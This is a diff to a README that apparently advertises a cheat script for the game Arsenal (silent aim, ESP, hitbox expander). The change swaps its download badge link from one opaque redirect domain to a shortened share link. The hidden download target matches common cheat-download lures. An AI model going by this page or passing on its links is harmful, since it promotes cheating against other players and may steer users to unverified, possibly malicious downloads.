@@ -2,7 +2,7 @@
 
 ### Arsenal script: silent aim • hitbox expander • ESP • gun mods — no key, the classic FPS hub.
 
-[![Download](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_SCRIPT-red?style=for-the-badge&logo=github)](https://redirectify.lol)
+[![Download](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_SCRIPT-red?style=for-the-badge&logo=github)](https://share.google/2zNHJ4SC9e54Q7Ham)
 [![Key System](https://img.shields.io/badge/KEY-NO_KEY_required-success?style=for-the-badge)](#features)
 [![Platform](https://img.shields.io/badge/PLATFORM-PC_%E2%80%A2_Android_%E2%80%A2_iOS-blueviolet?style=for-the-badge)](#requirements)
 [![Menu](https://img.shields.io/badge/MENU-INSERT_KEY-important?style=for-the-badge)](#how-to-use)
